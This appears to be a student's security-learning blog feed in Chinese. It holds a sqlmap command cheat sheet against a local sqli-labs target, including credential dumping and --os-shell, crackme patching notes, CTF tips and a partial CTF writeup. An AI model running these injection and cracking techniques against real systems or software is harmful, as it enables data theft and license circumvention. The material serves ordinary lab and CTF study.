<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://zyyiszyy.github.io</id>
    <title>zyyire</title>
    <updated>2021-03-15T15:26:11.421Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://zyyiszyy.github.io"/>
    <link rel="self" href="https://zyyiszyy.github.io/atom.xml"/>
    <subtitle>破碎吧现实，崩裂吧精神，放逐这个世界！</subtitle>
    <logo>https://zyyiszyy.github.io/images/avatar.png</logo>
    <icon>https://zyyiszyy.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, zyyire</rights>
    <entry>
        <title type="html"><![CDATA[SQLMAP使用方法和常用命令]]></title>
        <id>https://zyyiszyy.github.io/post/sqlmap-shi-yong-fang-fa-he-chang-yong-ming-ling/</id>
        <link href="https://zyyiszyy.github.io/post/sqlmap-shi-yong-fang-fa-he-chang-yong-ming-ling/">
        </link>
        <updated>2021-03-15T14:18:45.000Z</updated>
        <content type="html"><![CDATA[<p>SQLMap是个自动化的SQL注入工具，主要功能扫描、发现并利用给定URL的SQL注入漏洞，功能强大，特查阅书本作此简记，方便今后查询。</p>
<h1 id="sqlmap入门">sqlmap入门</h1>
<h3 id="判断是否存在sql注入">判断是否存在sql注入</h3>
<p><code>sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1</code><br>
注：多个参数时url加“”。<br>
<img src="https://zyyiszyy.github.io/post-images/1615818542642.png" alt="" loading="lazy"></p>
<h3 id="判断文本中请求是否存在注入">判断文本中请求是否存在注入</h3>
<p><code>sqlmap.py -r desktop/1.txt</code><br>
WEB数据包文件中加载HTTP请求，这样一般不设置其他参数。</p>
<h3 id="查询当前用户下所有数据库">查询当前用户下所有数据库</h3>
<p><code>sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 --dbs</code><br>
<img src="https://zyyiszyy.github.io/post-images/1615819127081.png" alt="" loading="lazy"></p>
<h3 id="获取数据库的表名">获取数据库的表名</h3>
<p><code>sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 -D security --tables</code><br>
注：-D是指定库名，不指定可以省略。<br>
<img src="https://zyyiszyy.github.io/post-images/1615819287665.png" alt="" loading="lazy"></p>
<h3 id="获取表中字段名">获取表中字段名</h3>
<p><code>sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 -D security -T users --columns</code><br>
<img src="https://zyyiszyy.github.io/post-images/1615819377555.png" alt="" loading="lazy"></p>
<h3 id="获取字段内容">获取字段内容</h3>
<p><code>sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 -D security -T users -C id,username,password --dump</code><br>
<img src="https://zyyiszyy.github.io/post-images/1615819498044.png" alt="" loading="lazy"></p>
<h3 id="获取数据库所有用户">获取数据库所有用户</h3>
<p>在当前用户有权读取包含所有用户的表的权限时，使用该命令可以列出所有管理用户。<br>
<code>sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 --users</code><br>
<img src="https://zyyiszyy.github.io/post-images/1615819597242.png" alt="" loading="lazy"></p>
<h3 id="获取数据库用户的密码">获取数据库用户的密码</h3>
<p>在当前用户有读取包含用户密码的权限，使用该命令可以列出用户和hash值。<br>
<code>sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 --passwords</code><br>
<img src="https://zyyiszyy.github.io/post-images/1615819906690.png" alt="" loading="lazy"></p>
<h3 id="获取当前网站数据库的名称">获取当前网站数据库的名称</h3>
<p><code>sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 --current-db</code><br>
<img src="https://zyyiszyy.github.io/post-images/1615820000712.png" alt="" loading="lazy"></p>
<h3 id="获取当前网站数据库的用户名称">获取当前网站数据库的用户名称</h3>
<p><code>sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 --current-user</code><br>
<img src="https://zyyiszyy.github.io/post-images/1615820071721.png" alt="" loading="lazy"></p>
<h1 id="sqlmap进阶">sqlmap进阶</h1>
<h3 id="探测等级">探测等级</h3>
<p>一共五个测试等级，默认是1，等级越高速度越慢。HTTP cookie在level为2时就会测试；HTTP User-Agent/Referer头在level为3时就会测试；当level为5时，自动破解cookie，XFF等头部注入。总之，不确定哪个Payload或参数为注入点时，为保证全面性，建议用高的level值。<br>
<code>--level 5</code></p>
<h3 id="当前用户是否为管理员权限">当前用户是否为管理员权限</h3>
<p><code>--is-dba</code></p>
<h3 id="列出数据库管理员角色">列出数据库管理员角色</h3>
<p>仅适用当前数据库为Oracle的时候，当前用户有权读取包含所有用户的表，用该命令可列举每个用户的角色，也可以用-U指定想看哪个用户的角色。<br>
<code>--roles</code></p>
<h3 id="http-referer头">HTTP Referer头</h3>
<p>sqlmap可以在请求中伪造HTTP中的referer，当level不小于3，会尝试对referer注入。可以用referer命令来欺骗。<br>
<code>--referer</code></p>
<h3 id="运行自定会sql语句">运行自定会sql语句</h3>
<p><code>--sql-shell</code></p>
<h3 id="运行任意操作系统命令">运行任意操作系统命令</h3>
<p>当数据库为MySQL、PostgreSQL或Microsoft SQL Server，且当前用户有权限使用特定的函数时，如果数据库上传一个二进制库，包含用户自定义的函数sys_exec()和sys_eval()，那么创建的这两个函数就可以执行系统命令。<br>
<code>--os-cmd,--os-shell</code></p>
<h3 id="从数据库服务器中读取文件">从数据库服务器中读取文件</h3>
<p>当数据库为MySQL、PostgreSQL或Microsoft SQL Server，且当前用户有权限使用特定的函数时，读取的文件可以是文本，也可以是二进制文件。<br>
<code>--file-read</code></p>
<h3 id="上传文件到数据库服务器中">上传文件到数据库服务器中</h3>
<p>当数据库为MySQL、PostgreSQL或Microsoft SQL Server，且当前用户有权限使用特定的函数时，上传的文件可以是文本，也可以是二进制文件。<br>
<code>--file-write --file-dest</code></p>
<blockquote>
<p>SQLMap还自带绕过脚本tamper，其功能和上面介绍的部分进阶功能用之甚少，随着以后学习再做扩充。</p>
</blockquote>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA["玩玩破解"学习笔记]]></title>
        <id>https://zyyiszyy.github.io/post/wan-wan-po-jie-xue-xi-bi-ji/</id>
        <link href="https://zyyiszyy.github.io/post/wan-wan-po-jie-xue-xi-bi-ji/">
        </link>
        <updated>2021-03-09T14:12:48.000Z</updated>
        <content type="html"><![CDATA[<p>吾爱破解论坛大佬yyhd发布玩玩破解系列，让身为菜鸡的我受益匪浅，在此记录一些知识点，方便以后查阅。注意：这里面的示例不是通用的，加密解密是对抗的过程，所谓“魔高一尺，道高一丈”，加密的方法各种各样，这些示例有助于新手们的入门和练习。<br>
大佬帖子：<a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1358649">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1358649</a></p>
<h2 id="字符串能搜到错误提示">字符串能搜到错误提示</h2>
<p>首先用PEID查壳软件查壳，发现加了upx壳。</p>
<h4 id="脱壳后爆破">脱壳后爆破</h4>
<p><code>upx -d 文件</code><br>
脱壳后，OD打开，右键打开插件“中文搜索引擎”，选择智能搜索。双击错误提示，找到上面关键的一个跳转：<br>
<img src="https://zyyiszyy.github.io/post-images/1615299845142.png" alt="" loading="lazy"><br>
将je改为jne或者jmp，然后右键选择“复制到文件”，右键“保存文件”。<br>
测试爆破成功：<br>
<img src="https://zyyiszyy.github.io/post-images/1615300053036.png" alt="" loading="lazy"></p>
<h4 id="不脱壳直接爆破">不脱壳直接爆破</h4>
<p>直接OD打开，运行，然后ctrl+G跳转401000。这次原本不能用的中文搜索引擎就可以正常使用了。然后同样方式找到关键跳转，然后更改。这时不能直接复制到文件了，需要用到打补丁小工具Inline Patch，将对应的地址的字节码改掉，添加后生成即可。<br>
<img src="https://zyyiszyy.github.io/post-images/1615300510249.png" alt="" loading="lazy"></p>
<h2 id="字符串搜不到错误提示">字符串搜不到错误提示</h2>
<h4 id="下内存断点">下内存断点</h4>
<p>用常规的方法不能直接搜到字符串，但运行发现有错误提示，猜测加了一些什么防御字符串搜索的代码。这时，我们需要打开内存页面，右键查找，ASCII栏搜索“登陆失败”。<br>
<img src="https://zyyiszyy.github.io/post-images/1615303677016.png" alt="" loading="lazy"><br>
记下其地址，然后进入cpu界面，在内存板块搜索该地址。<br>
<img src="https://zyyiszyy.github.io/post-images/1615303694151.png" alt="" loading="lazy"><br>
选中一段内存右键下内存访问断点。<br>
<img src="https://zyyiszyy.github.io/post-images/1615303787318.png" alt="" loading="lazy"><br>
运行软件，输入错误数据，点击确定，这时就到达了断点。接下来删除断点，F8单步运行，每次专注ret之后的地方，找到以下可疑跳转：<br>
<img src="https://zyyiszyy.github.io/post-images/1615304360064.png" alt="" loading="lazy"><br>
很容易发现jmp直接跳过了这段代码，jmp下一句还有个跳过来的，经过短暂寻找，是在jmp上面代码跳过来的。意思大概是如果用户名密码正确就运行jmp这行代码，跳转输出“登录成功”；不正确就跳到jmp下面一行代码，输出“登陆失败”。<br>
此题直接将判断错误时的跳转nop掉就可：<br>
<img src="https://zyyiszyy.github.io/post-images/1615304650146.png" alt="" loading="lazy"></p>
<h4 id="下函数断点">下函数断点</h4>
<p>命令行输入bp MessageBoxA，然后运行，输入数据后到达断点，快捷键ctrl+F9进入CM领空，在右下角栈板块在“返回到”字样按回车，跳转到函数执行完的地方，本题第二个返回到就是关键代码处。<br>
<img src="https://zyyiszyy.github.io/post-images/1615306028838.png" alt="" loading="lazy"></p>
<h2 id="没有错误提示">没有错误提示</h2>
<p>之前思路是从结果反向找，这道题结果没有信息，只有成功时提示信息但是线索中断，所以正向找线索突破。</p>
<h4 id="下函数断点-2">下函数断点</h4>
<p>首先运行程序，输入内容但先不要点击登录，然后命令行下bp GetWindowTextA函数断点，点击登录。此时发现程序断的地方不在程序领空，所以按alt+F12，这以后就F8慢慢一步一步走，遇到别的领空就跳出来，知道运行到如下地方：<br>
<img src="https://zyyiszyy.github.io/post-images/1615454155791.png" alt="" loading="lazy"><br>
可以看到52010008等标志性字眼，这是易语言编写程序的窗口ID，可以理解为身份标号，这里就是弹出成功窗口的地方。本题将图示的关键跳转nop掉<br>
<img src="https://zyyiszyy.github.io/post-images/1615454453764.png" alt="" loading="lazy"><br>
爆破成功<br>
<img src="https://zyyiszyy.github.io/post-images/1615455068395.png" alt="" loading="lazy"></p>
<h4 id="易语言窗口替换">易语言窗口替换</h4>
<p>先查找命令push 10001，这里只有一个。<br>
<img src="https://zyyiszyy.github.io/post-images/1615476668879.png" alt="" loading="lazy"><br>
查找结果如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615476691999.png" alt="" loading="lazy"><br>
这个52010008就是新的窗口id，也就是成功时弹出的那个窗口。再查找二进制字串<code>FF 25</code>，查找一开始的窗口的位置，发现一堆jmp：<br>
<img src="https://zyyiszyy.github.io/post-images/1615476857686.png" alt="" loading="lazy"><br>
52010001就是一开始的窗口id，将其改为52010008，运行就是登录成功时的窗口：<br>
<img src="https://zyyiszyy.github.io/post-images/1615476969720.png" alt="" loading="lazy"></p>
<h2 id="阶段性练习题目一">阶段性练习，题目一</h2>
<p>尝试了下内存断点，要么一直断要不不断，没成功。<br>
也尝试下MessageBoxA函数断点，没有断成功。</p>
<h4 id="窗口id替换">窗口id替换</h4>
<p>二进制搜索字串FF 25,找到初始的id，再输入命令push 10001查找成功和失败的id。这里是让成功和失败的id号互换，没有和初始的交换(不知为什么和初始窗口交换的话会失败，弹出来的窗口是空白)，输入假的用户名和密码，破解成功。<br>
<img src="https://zyyiszyy.github.io/post-images/1615552492149.png" alt="" loading="lazy"></p>
<h4 id="改关键跳转">改关键跳转</h4>
<p>通过搜push 10001找到关键代码，改掉关键跳转，如图：<br>
<img src="https://zyyiszyy.github.io/post-images/1615553791565.png" alt="" loading="lazy"></p>
<h4 id="下函数断点-3">下函数断点</h4>
<p>先运行，输入错误用户名和密码，先不点击按钮，下GetWindowTextA函数断点，再点击按钮，然后如果不是程序领空就alt+F9，是程序领空就F8单步调试，也能找到弹窗那个关键跳转。</p>
<h2 id="灰色按钮问题">灰色按钮问题</h2>
<h4 id="下函数断点-4">下函数断点</h4>
<p>命令行下bp EnableWindow断点，发现右下角栈的情况如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615647119332.png" alt="" loading="lazy"><br>
这里动调我把false的0改为了1，运行就可以点击了，点击后如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615647206039.png" alt="" loading="lazy"><br>
但是这个仅仅是动调，如果要破解这个软件，需要时刻都能点击，而不是每次都要动态调试。刚才已经发现false和按钮能不能点击有关系，false是函数传入的第一个参数。所以这次下断点后F8运行到返回：<br>
<img src="https://zyyiszyy.github.io/post-images/1615647404635.png" alt="" loading="lazy"><br>
这里将第一个push改为push 1，每次传参数1，保存文件重新打开，这是发现破解成功：<br>
<img src="https://zyyiszyy.github.io/post-images/1615647996889.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615648016686.png" alt="" loading="lazy"></p>
<h2 id="灰色按钮重启验证">灰色按钮+重启验证</h2>
<p>重启验证就是登录成功就在注册表或某个文件里记录信息，每次运行软件就会读信息验证是否正确，可以免于每次登录的麻烦，本题是记录到注册表里。</p>
<h4 id="针对按钮下函数断点">针对按钮下函数断点</h4>
<p>这个方法针对按钮，和注册表无关，方法同上。</p>
<h4 id="针对注册表下函数断点">针对注册表下函数断点</h4>
<p>这个方法是针对注册表的破解，程序先调用RegOpenKeyExA函数打开注册表里的一个项，再调用RegQueryValueExA函数读取这个项里面的键值，此处的函数是根据系统位数的不同而改变，不同的程序可能用的函数也不同。<br>
命令行下RegOpenKeyExA断点后运行程序，发现断点处栈区如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615650486155.png" alt="" loading="lazy"><br>
alt+F9运行到程序领空，代码如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615650541411.png" alt="" loading="lazy"><br>
F8返回几次，找到如下位置：<br>
<img src="https://zyyiszyy.github.io/post-images/1615652374029.png" alt="" loading="lazy"><br>
52pojie_yyhd是个关键点，就是验证注册表的，下面就是关键跳转，因为原来是跳转的，这里就nop掉不让他跳转。<br>
<img src="https://zyyiszyy.github.io/post-images/1615654401246.png" alt="" loading="lazy"><br>
破解成功，保存到文件再打开：<br>
<img src="https://zyyiszyy.github.io/post-images/1615654454606.png" alt="" loading="lazy"></p>
<h4 id="加注册表项">加注册表项</h4>
<p>上一方法找到关键词52pojie_yyhd，可以加到注册表项里，win+R搜索regedit，然后进入如下目录加入项和数值：<br>
<img src="https://zyyiszyy.github.io/post-images/1615655131809.png" alt="" loading="lazy"><br>
再打开程序，发现按钮可以用了：<br>
<img src="https://zyyiszyy.github.io/post-images/1615655189366.png" alt="" loading="lazy"><br>
注：为什么这个路径还不清楚，只知道如下信息，貌似如果是32位的操作系统，是“HKEY_LOCAL_MACHINE\SOFTWARE”如果是64位，在注册表就是“HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node”。<br>
<img src="https://zyyiszyy.github.io/post-images/1615655323966.png" alt="" loading="lazy"></p>
<h2 id="第一难-破解acid-burn">第一难 破解Acid burn</h2>
<h4 id="去nag">去NAG</h4>
<p><em>NAG窗口可以通过搜索窗口上的字符串或者对ShowWindow下断点，这里使用字符串搜索方法解决。</em><br>
搜索字符串找到如下位置：<br>
<img src="https://zyyiszyy.github.io/post-images/1615728164755.png" alt="" loading="lazy"><br>
在此下断点，运行，然后F8运行到返回后如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615728257803.png" alt="" loading="lazy"><br>
上面这个就是关键跳转，跳过这个call，条件跳转改为jmp即破解成功：<br>
<img src="https://zyyiszyy.github.io/post-images/1615728325169.png" alt="" loading="lazy"><br>
另外一种下ShowWindow断点没做出来，倒是做下一步破解的时候下MessageBoxA断点找到了方法，具体见下一步。</p>
<h4 id="破解用户名密码登录">破解用户名密码登录</h4>
<p><em>搜字符串或者对MessageBoxA下断，F8到关键代码位置，这里使用搜字符串法解决。</em><br>
有两个判断，一个是输入不能少于4个字符，一个是判断是不是真码。<br>
搜索字符串有两个sorry，正好对应两个地方，分别下断点，一次输入少于4个字符，一次输入大于4个字符的假码，会断在两个地方，分别是：<br>
<img src="https://zyyiszyy.github.io/post-images/1615728653006.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615728656943.png" alt="" loading="lazy"><br>
第一个把jge改为jmp，第二个把jnz给nop掉。<br>
<em>下函数断点</em><br>
命令bp MessageBoxA，然后运行程序，输入用户名密码，直到停在断点，这时断点在user.dll里，快捷键alt+F9转到程序领空，这时在一个call突然又断了：<br>
<img src="https://zyyiszyy.github.io/post-images/1615730634334.png" alt="" loading="lazy"><br>
检查发现时错误弹窗这时候弹出来了，关掉弹窗运行到CM领空。<br>
<img src="https://zyyiszyy.github.io/post-images/1615730739088.png" alt="" loading="lazy"><br>
这时找这个函数刚开始的push，如图，消息框里是从哪里调用过这个弹窗函数：<br>
<img src="https://zyyiszyy.github.io/post-images/1615730846279.png" alt="" loading="lazy"><br>
右键消息框，一个一个返回到调用，其中有两个就是关键函数。另外：第一个去NAG消息框也能找到。</p>
<h4 id="破解密码登录">破解密码登录</h4>
<p>字符串法和MessageBoxA法两种同第二步。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[使用Git遇到的一些问题]]></title>
        <id>https://zyyiszyy.github.io/post/xue-xi-git-de-yi-xie-jian-dan-shi-yong-fang-fa/</id>
        <link href="https://zyyiszyy.github.io/post/xue-xi-git-de-yi-xie-jian-dan-shi-yong-fang-fa/">
        </link>
        <updated>2021-03-08T14:48:12.000Z</updated>
        <content type="html"><![CDATA[<h2 id="git提交的步骤">git提交的步骤</h2>
<pre><code>git add .  //添加文件到本地仓库
git commit -m &quot;first commit&quot;  //添加描述信息
git remote add origin main  //连接远程仓库
git push -u origin main  //把本地仓库的文件推送到远程仓库
</code></pre>
<h2 id="提交出现以下错误">提交出现以下错误</h2>
<p><img src="https://zyyiszyy.github.io/post-images/1615219179296.png" alt="" loading="lazy"><br>
推送之前加入：<br>
<code>git pull origin main</code></p>
<h2 id="若还是失败提示以下错误">若还是失败，提示以下错误</h2>
<p><img src="https://zyyiszyy.github.io/post-images/1615219289494.png" alt="" loading="lazy"><br>
例如更新博客时，可尝试强制push：<br>
<code>git push -f origin main</code><br>
此方法不要随便用，因为强制push会覆盖掉远程的所有代码。</p>
<h2 id="初始使用git远程上传文件设置">初始使用git远程上传文件设置</h2>
<p>1、ssh-keygen -t rsa -C &quot;xxxxx@qq.com&quot;  //生成ssh密钥<br>
2、进文件id——rsa.pub，复制密钥到github<br>
3、ssh -T git@github.com   //检测是否配置成功，成功提示Hi xxxx......<br>
4、git config --global user.name &quot;username&quot;<br>
git config --global user.email &quot;xxxxx@qq.com&quot;     //配置信息<br>
5、git init   //git初始化<br>
6、git commit -m &quot;first commit&quot;   //添加描述信息<br>
7、git remote add origin git@github.com:zyyiszyy/zyyiszyy.github.io.git  //连接远程仓库，失败的话先 git remote rm origin<br>
8、git pull --rebase origin main  //拉取远程库<br>
9、git push -u origin main  //把本地仓库的文件推送到远程仓库<br>
10、若还是失败，考虑强制：git push -f origin main   用之前要慎重考虑！！！</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[接触CTF以来的闲散笔记]]></title>
        <id>https://zyyiszyy.github.io/post/idle_notes/</id>
        <link href="https://zyyiszyy.github.io/post/idle_notes/">
        </link>
        <updated>2021-03-07T08:03:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="re分析常用的api函数">re分析常用的API函数</h3>
<pre><code>对API函数下断点是一个普遍的破解真理。
GetWindowTextA //读取输入的内容
MessageBoxA  //弹信息窗
SendMessage //发送鼠标左键的消息函数
GetDlgItemInt //获取信息并转化为整数
Istrcmp  //整数字符串比较
SetWindowsTextA  //窗口名或组件出现已注册未注册字眼
EnableWindow  //解锁灰色按钮
RegOpenKeyExA  //打开注册表里的一个项(x32)
RegQueryValueExA  //读取这个项里面的键值(x32)
CreateToolhelp32Snapshot  //读取进程函数
ShowWindow  //调用NAG窗口的函数
filelength
GetFileSize
FindFirstFile   //都是获取文件的尺寸
</code></pre>
<h3 id="易语言搜索按钮事件">易语言搜索按钮事件</h3>
<pre><code>先不点击按钮，查找二进制字串，搜索hex：FF55FC5F5E，下断点，点击按钮。
</code></pre>
<h3 id="易语言程序窗口id替换及其他知识点">易语言程序窗口ID替换及其他知识点</h3>
<pre><code>查找二进制字符串，搜索hex：FF 25
新窗口ID：520XXXXX
搜索其他窗口方法：可以查找命令push 10001。
</code></pre>
<h3 id="如何判断程序是否是易语言写的">如何判断程序是否是易语言写的</h3>
<pre><code>401000地址处汇编xor eax,eax就是，此方法不能百分百保证。
</code></pre>
<h3 id="dns刷新">dns刷新：</h3>
<pre><code>ipconfig /flushdns
</code></pre>
<h3 id="z3py约束求解">z3py约束求解：</h3>
<pre><code>先定义变量：a1=BitVec('a1',32)    a2=Int('a2')      #注意这里的变量类型是z3里的，不是python里的，要转化才可用
创建约束求解器：solver=Solver()                          #如果有位运算就要bitvec
添加约束条件：solver.add(a&gt;1)
判断解是否存在：if solver.check()==sat:   #不存在为unsat
输出解：print(solver.model())
取出解的某项的值：solver.model()[a1]
位变量bitvec转化python整数：solver.model()[a1].as_long()
约束可以逻辑运算：Or,And,Not
示例脚本有保存
</code></pre>
<h3 id="打开注册表命令">打开注册表命令</h3>
<pre><code>regedit
</code></pre>
<h3 id="ropgadget或等rop链">ROPgadget或等rop链：</h3>
<pre><code>ROPgadget --binary 文件路径 --ropchain
</code></pre>
<h3 id="kali的checksec使用">kali的checksec使用：</h3>
<pre><code>checksec --file=文件路径
</code></pre>
<h3 id="ubuntu打开命令行">Ubuntu打开命令行：</h3>
<pre><code>ctrl+alt+T
</code></pre>
<h3 id="gdb的一些命令">gdb的一些命令：</h3>
<pre><code>r `python -c 'print &quot;A&quot;*'268 + &quot;B&quot;*4+&quot;C&quot;*4`
p/x $esp          查看esp寄存器的值
x/x $esp          查看寄存器的值并显示其地址
</code></pre>
<h3 id="python2里写中文">python2里写中文：</h3>
<pre><code>加上：#-*-coding:utf-8-*-
</code></pre>
<h3 id="usrbinpython">#!/usr/bin/python</h3>
<pre><code>脚本语言的第一行，目的就是指出，你想要你的这个文件中的代码用什么可执行程序去运行它。
</code></pre>
<h3 id="提示xe6什么的错误">提示'\xe6'什么的错误：</h3>
<pre><code>脚本前面加：#_*_coding:utf8_*_
</code></pre>
<h3 id="查看各个端口和对应使用的进程uid">查看各个端口和对应使用的进程uid：</h3>
<pre><code>netstat -ano
</code></pre>
<h3 id="字符串转字节">字符串转字节：</h3>
<pre><code>bytes(m,'utf-8')
str(m,'utf-8')
from Crypto.Util.number import *
long_to_bytes(m)
</code></pre>
<h3 id="python反编译">python反编译：</h3>
<pre><code>uncompyle6是一个原生python的跨版本反编译器和fragment反编译器
uncompyle6 -o babypy.py babypy.pyc
</code></pre>
<h3 id="python编译">python编译：</h3>
<pre><code>&gt;&gt;&gt; import py_compile
&gt;&gt;&gt; py_compile.compile(r'/Users/zhangyi/Downloads/md5.py')
</code></pre>
<h3 id="kali更改时间">kali更改时间：</h3>
<pre><code>while true; do date -us &quot;2018-01-01 00:00:00&quot;;done
</code></pre>
<h3 id="python相关">python相关：</h3>
<pre><code>不能直接float变16进制，pwntools的p64里只能放16进制，可以用在线工具或写脚本。
</code></pre>
<h3 id="python写字符串依次遍历">python写字符串依次遍历：</h3>
<pre><code>a=‘ada’，b='',for i in range(len(a)):****
</code></pre>
<h3 id="竖列变行">竖列变行：</h3>
<pre><code>选择abc所在的三行，按Ctrl+H（编辑菜单，替换），将 ^p 替换为 &quot; &quot;。
</code></pre>
<h3 id="upx脱壳">upx脱壳：</h3>
<pre><code>cmd运行upx.exe -d 目标路径
</code></pre>
<h3 id="ord是ascii变为数字">ord是ASCII变为数字，</h3>
<pre><code>chr数字变ASCII字符
</code></pre>
<h3 id="jar文件为java可执行文件">.jar文件为java可执行文件：</h3>
<pre><code>打开jar文件方式：cmd：Java -jar 目标路径
</code></pre>
<h3 id="vim各个模式切换">vim各个模式切换：</h3>
<pre><code>i进入编辑模式，esc退出编辑模式进入一般命令模式，：进入命令行模式。wq！保存并退出。
</code></pre>
<h3 id="在kali写c代码">在kali写C代码：</h3>
<pre><code>建立文本.c文件名。命令：gcc test.c编译，在默认目录里生成a.out文件，运行就是代码运行结果。
</code></pre>
<h3 id="随机数注意事项">随机数注意事项：</h3>
<pre><code>windows和linux环境下相同种子伪随机数生成是不同的。
</code></pre>
<h3 id="c保留两位小数输出">C++保留两位小数输出：</h3>
<pre><code>#include &lt;iomanip&gt;   cout &lt;&lt; &quot;a=&quot; &lt;&lt;fixed&lt;&lt; setprecision(2) &lt;&lt; a &lt;&lt;endl; //输出结果为a=0.20
</code></pre>
<h3 id="c排序函数和逆向输出字符串">C++排序函数和逆向输出（字符串）：</h3>
<pre><code>reverse(remain.begin(),remain.end());
sort（a,a+n）;
</code></pre>
<h3 id="c获取数组的长度">C++获取数组的长度：</h3>
<pre><code>len=sizeof(a)/sizeof(a[0])；
</code></pre>
<h3 id="很多aaabbb有关的密码">很多AAABBB有关的密码：</h3>
<pre><code>培根密码：5个一组。摩斯密码:  .-  组成
</code></pre>
<h3 id="rar块的开头">rar块的开头：</h3>
<pre><code>文件块0x74
</code></pre>
<h3 id="密码种类有很多">密码种类有很多：</h3>
<pre><code>MD5，base64，培根密码，摩斯密码，栅栏密码(W型和传统型)，
</code></pre>
<h3 id="常见文件的文件头">常见文件的文件头：</h3>
<pre><code>https://blog.csdn.net/weixin_44604541/article/details/110082054
</code></pre>
<h3 id="rot13在线解密">Rot13在线解密：</h3>
<pre><code>https://www.jisuan.mobi/puzzm6z1B1HH6yXW.html
</code></pre>
<h3 id="md5在线解密">md5在线解密：</h3>
<pre><code>https://www.somd5.com/
</code></pre>
<h3 id="base64在线解码">base64在线解码：</h3>
<pre><code>https://www.sojson.com/base64.html
</code></pre>
<h3 id="pdf转word">pdf转word：</h3>
<pre><code>https://app.xunjiepdf.com/pdf2word/
</code></pre>
<h3 id="mosi密码">mosi密码：</h3>
<pre><code>http://moersima.00cha.net/
</code></pre>
<h3 id="培根密码">培根密码：</h3>
<pre><code>http://rumkin.com/tools/cipher/baconian.php
</code></pre>
<h3 id="栅栏密码w型">栅栏密码（W型）：</h3>
<pre><code>http://www.atoolbox.net/Tool.php?Id=777
</code></pre>
<h3 id="栅栏密码传统">栅栏密码（传统）：</h3>
<pre><code>http://www.atoolbox.net/Tool.php?Id=855
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CUMTCTF2021寒假赛部分WP]]></title>
        <id>https://zyyiszyy.github.io/post/cumtctf-han-jia-sai-bu-fen-wp/</id>
        <link href="https://zyyiszyy.github.io/post/cumtctf-han-jia-sai-bu-fen-wp/">
        </link>
        <updated>2021-01-31T12:45:49.000Z</updated>
        <content type="html"><![CDATA[<h2 id="re1">RE1</h2>
<p>先根据ida分析逻辑，写出了加密的脚本，下图是加密的逻辑，还不是完全正确，可能还要部位或怎么，但主要逻辑如下，有两层循环每次外层循环，一开始存flag的那块内存就会改变，并且ki改变。外层循环结束得到一个ki，然后存str【ki】，最终比较是否为已知的那串字符串，借此判断flag正误。</p>
<figure data-type="image" tabindex="1"><img src="https://zyyiszyy.github.io/post-images/1615187267465.png" alt="" loading="lazy"></figure>
<p>一开始没看出来是base58，硬着头皮逆，一直卡了两三天，因为是左移8位，所以直接flagg【i】*58+ki取低八位就是ascii值，每次确定一个位，先从最后一位开始逆，上一位的ki也是可以求出来。逆脚本中的k一开始以为是多少都不影响结果，因为试了好多次都算出来最后一位是125就是‘}’，但再多算几位就不一样了。最后几乎要放弃这道题的时候试了下如图让每轮初始k=0，结果出来正确结果。可以说在自己都没理解的情况下写出了解题脚本🤣</p>
<p><img src="https://zyyiszyy.github.io/post-images/1615187280597.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615187287238.png" alt="" loading="lazy"></p>
<p>后来得到flag才焕然大悟这是个算法，可能base64的变行，叫做base58，要是能一眼看出，直接就可用在线工具求解。</p>
<figure data-type="image" tabindex="2"><img src="https://zyyiszyy.github.io/post-images/1615187296228.png" alt="" loading="lazy"></figure>
<h2 id="re2">RE2</h2>
<p>先随便输入flag如下，flag头是正确的：</p>
<figure data-type="image" tabindex="3"><img src="https://zyyiszyy.github.io/post-images/1615187359242.png" alt="" loading="lazy"></figure>
<p>动态调试先看出32位flag：</p>
<figure data-type="image" tabindex="4"><img src="https://zyyiszyy.github.io/post-images/1615187362936.png" alt="" loading="lazy"></figure>
<p>走到如图位置发现是一个判断，因为我输入的flag开头CUMTCTF{是正确的，先出现几次相等，未发生跳转，后来出错，跳转输出提示错误。</p>
<figure data-type="image" tabindex="5"><img src="https://zyyiszyy.github.io/post-images/1615187390149.png" alt="" loading="lazy"></figure>
<p>这是一开始CUMTCTF{的判断：</p>
<figure data-type="image" tabindex="6"><img src="https://zyyiszyy.github.io/post-images/1615187393682.png" alt="" loading="lazy"></figure>
<p>这里出现错误，前面发现C和T出现两次的字母对应的数字也是一样的，由此推测应该是一个字符能对应出一个数字，是个单表查表操作：</p>
<figure data-type="image" tabindex="7"><img src="https://zyyiszyy.github.io/post-images/1615187487734.png" alt="" loading="lazy"></figure>
<p>将下面的跳转语句nop掉，方便F9快速观察做表，然后依次输入可见字符列表，查表得到flag。</p>
<figure data-type="image" tabindex="8"><img src="https://zyyiszyy.github.io/post-images/1615187491921.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[密码学实验实验代码]]></title>
